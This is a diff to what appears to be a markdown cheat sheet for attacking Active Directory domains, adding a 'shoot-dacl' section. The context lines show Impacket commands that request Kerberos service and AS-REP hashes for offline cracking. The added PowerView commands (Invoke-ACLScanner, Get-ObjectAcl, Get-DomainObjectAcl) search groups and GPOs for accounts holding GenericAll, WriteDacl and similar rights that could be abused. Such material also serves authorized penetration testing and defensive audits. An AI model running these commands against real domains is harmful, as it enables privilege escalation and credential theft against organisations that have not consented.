@@ -208,7 +208,22 @@ GetUserSPNs.py $zdom_fqdn/$ztarg_user_name:$ztarg_user_pass -dc-ip $zdom_dc_ip -
 GetNPUsers.py $zdom_fqdn/$ztarg_user_name:$ztarg_user_pass -dc-ip $zdom_dc_ip -request >> np_users.txt 
 ```
 
-#### <a name='shoot-acls'></a>shoot-acls
+#### <a name='shoot-acls'></a>shoot-dacl
+```sh
+# STEP 1: global gathering
+Invoke-ACLScanner -ResolveGUIDs -Domain $zdom_fqdn -DomainController $zdom_dc_fqdn 
+
+# STEP 2: check for "authenticated users" and "everyone" group
+
+# STEP 3: gather info on security groups
+#$ztarg_group="Domain Computers"
+$ztarg_group="RDP Users"
+Get-ObjectAcl -SamAccountName $ztarg_group -ResolveGUIDs -Verbose -Domain $zdom_fqdn -DomainController $zdom_dc_fqdn | ? { ($_.SecurityIdentifier -match '^S-1-5-.*-[1-9]\d{3,}$') -and ($_.ActiveDirectoryRights -match 'WriteProperty|GenericAll|GenericWrite|WriteDacl|WriteOwner')}
+Invoke-ACLScanner -ResolveGUIDs -Domain $zdom_fqdn -DomainController $zdom_dc_fqdn | ?{$_.IdentityReference -match $ztarg_group}
+
+# STEP 4: enumerate permissions for GPOs where users with RIDs of > -1000 have some kind of modification/control rights
+Get-DomainObjectAcl -LDAPFilter '(objectCategory=groupPolicyContainer)' -Domain $zdom_fqdn -DomainController $zdom_dc_fqdn  | ? { ($_.SecurityIdentifier -match '^S-1-5-.*-[1-9]\d{3,}$') -and ($_.ActiveDirectoryRights -match 'WriteProperty|GenericAll|GenericWrite|WriteDacl|WriteOwner')}
+```
 
 #### <a name='shoot-gpos'></a>shoot-gpos
 ```
